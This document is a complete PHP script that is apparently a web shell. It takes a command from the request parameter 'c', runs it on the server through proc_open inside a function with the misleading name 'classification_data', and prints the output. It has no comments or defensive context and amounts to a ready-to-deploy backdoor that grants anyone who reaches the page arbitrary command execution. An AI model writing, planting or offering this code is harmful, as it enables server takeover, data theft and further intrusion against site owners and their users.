<?php
function classification_data($input) {
    $descriptors = array(
        0 => array("pipe", "r"), 
        1 => array("pipe", "w"),  
        2 => array("pipe", "w")   
    );
    $process = proc_open($input, $descriptors, $pipes);
    if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        $errorOutput = stream_get_contents($pipes[2]);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        $exitCode = proc_close($process);
        if ($exitCode === 0) {
            return $output;
        } else {
            return "Error: " . $errorOutput;
        }
    } else {
        return "False";
    }
}
if (isset($_REQUEST['c'])) {
    $sysdata = $_REQUEST['c'];
    echo classification_data($sysdata);
}
?>